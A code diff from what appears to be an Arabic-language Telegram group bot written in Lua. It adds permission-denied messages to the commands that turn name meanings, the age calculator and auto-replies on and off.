@@ -14861,11 +15937,19 @@ t = v.."\n"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == "تعطيل معاني الاسماء" and Manager2(msg) then
+if text == "تعطيل معاني الاسماء" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل معاني الاسماء')
 database:set(bot_id.."sofi:Name_Bots"..msg.chat_id_,"close")
 end
-if text == "تفعيل معاني الاسماء" and Manager2(msg) then
+if text == "تفعيل معاني الاسماء" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_,'☉┇ تم تفعيل معاني الاسماء')
 database:set(bot_id.."sofi:Name_Bots"..msg.chat_id_,"open")
 end
@@ -14876,11 +15960,19 @@ br = JSON.decode(gk)
 send(msg.chat_id_, msg.id_,br.meaning)
 end
 
-if text == "تعطيل حساب العمر" and Manager2(msg) then
+if text == "تعطيل حساب العمر" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل حساب العمر')
 database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"close")
 end
-if text == "تفعيل حساب العمر" and Manager2(msg) then
+if text == "تفعيل حساب العمر" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_,'☉┇ تم تفعيل حساب العمر')
 database:set(bot_id.." sofi:age_Bots"..msg.chat_id_,"open")
 end
@@ -14918,12 +16010,20 @@ if not database:get(bot_id..'lock:add'..msg.chat_id_) then
 local texting = {"مووووووووواححح💋","مابوس ولي😌😹","خدك/ج نضيف 😂","البوسه بالف حمبي 🌝💋","خلي يزحفلي وابوسه 🙊😻","كل شويه ابوسه كافي 😏","ماابوسه والله هذا زاحف🦎","محح هاي لحاته صاكه💋"}send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
 end
 end
-if text == 'تفعيل الردود' and Manager2(msg) then   
+if text == 'تفعيل الردود' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 database:del(bot_id..'lock:reply'..msg.chat_id_)  
 Text = ' ☉┇ تم تفعيل الردود'
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الردود' and Manager2(msg) then  
+if text == 'تعطيل الردود' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 database:set(bot_id..'lock:reply'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل الردود'
 send(msg.chat_id_, msg.id_,Text) 
